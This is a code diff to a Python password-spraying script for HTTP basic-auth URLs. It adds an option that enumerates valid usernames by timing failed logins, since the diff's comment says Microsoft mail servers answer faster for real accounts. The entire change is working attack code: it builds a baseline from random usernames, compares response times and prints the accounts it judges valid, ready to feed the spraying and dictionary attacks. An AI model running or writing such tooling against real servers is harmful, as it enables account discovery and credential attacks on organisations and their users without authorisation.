@@ -53,6 +53,7 @@ def main():
   global found, args
   signal.signal(signal.SIGINT, cancel_handler)
   parser = argparse.ArgumentParser(description="Script for password spraying basic auth URLs")
+  parser.add_argument("-e", "--enumerate", action="store_true", help="Attempt time-based username enumeration")
   parser.add_argument("-c", "--credslist", help="File with list of credentials in <username>:<password> format to use")
   parser.add_argument("-u", "--user", help="Username to dictionary attack as")
   parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
@@ -87,6 +88,55 @@ def main():
   users = []
   passwords = []
   creds = []
+
+  # Attempt time-based username enumeration. Valid users are quicker to respond on MS mail servers
+  # Inspired by: https://github.com/busterb/msmailprobe
+  if ( args.user or args.userlist ) and args.enumerate:
+    for url in urls:
+      userlist = []
+      enumerated = []
+      if args.user: userlist.append(args.user)
+      if args.userlist:
+        with open( args.userlist, "r" ) as f:
+          for u in f.read().splitlines():
+            userlist.append(u)
+
+      # Generate fake usernames
+      import random, string
+      fakeusers = []
+      for i in range(10):
+        fakeusers.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=10)))
+
+      # Determine an average response time for fake usernames
+      print('Working out an average response time for invalid usernames...' )
+      import time, statistics
+      responsetimes = []
+      for u in fakeusers:
+        start = round(time.time() * 1000)
+        test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url )
+        responsetimes.append(round(time.time() * 1000) - start)
+      avgresponse = statistics.mean( responsetimes )
+      print('\nAverage response time:',avgresponse,'ms')
+
+      # Run through each user, compare to average
+      for u in userlist:
+        start = round(time.time() * 1000)
+        test_login( u, 'ThisIsNotAnyonesRealPasswordIShouldHope', url )
+        elapsed = round(time.time() * 1000) - start
+        # print('Elapsed:', elapsed)
+
+        # If it's significantly less than average, it's valid. I guess we're hard-coding the significance!
+        if elapsed < (avgresponse * 0.77):
+          enumerated.append( u )
+          print("[+] " + u )
+        else:
+          print("[-] " + u )
+
+      print('Finished enumeration on', url)
+      if len( enumerated ) > 0:
+        print( 'Valid users:\n\n' + '\n'.join(enumerated))
+      else:
+        print( 'No valid users found :(' )
   
   if (( args.user or args.userlist ) and ( args.password or args.passlist )) or args.credslist:
     
